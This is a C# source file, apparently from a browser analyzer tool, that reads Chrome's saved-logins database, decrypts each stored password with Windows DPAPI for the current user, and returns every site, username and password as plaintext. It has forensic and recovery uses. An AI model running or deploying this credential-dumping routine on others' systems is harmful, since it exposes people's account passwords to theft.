using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace ChromeAnalyzer {
    public class ChromePasswordsAnalyzer : BrowserAnalyzer.PasswordsAnalyzer {
        private SQLite.Client client;

        public ChromePasswordsAnalyzer(string location) {
            client = new SQLite.Client(location);
        }

        public string getPasswords() {
            DataTable storedSignOns;
            string s = "SELECT signon_realm AS url, username_value as username, password_value as pass " +
                       "FROM logins " +
                       "WHERE username != ''";

            storedSignOns = client.select(s);

            s = "";
            foreach (DataRow r in storedSignOns.Rows) {

                // TODO: Catch the CryptographicException!!!

                byte[] passBytes = (byte[]) r["pass"];
                passBytes = ProtectedData.Unprotect(passBytes, null, DataProtectionScope.CurrentUser);
                string pass = System.Text.Encoding.Default.GetString(passBytes);

                s += r["url"] + " -> " + r["username"] + " : " + pass + "\r\n";
            }

            return s;
        }
    }
}
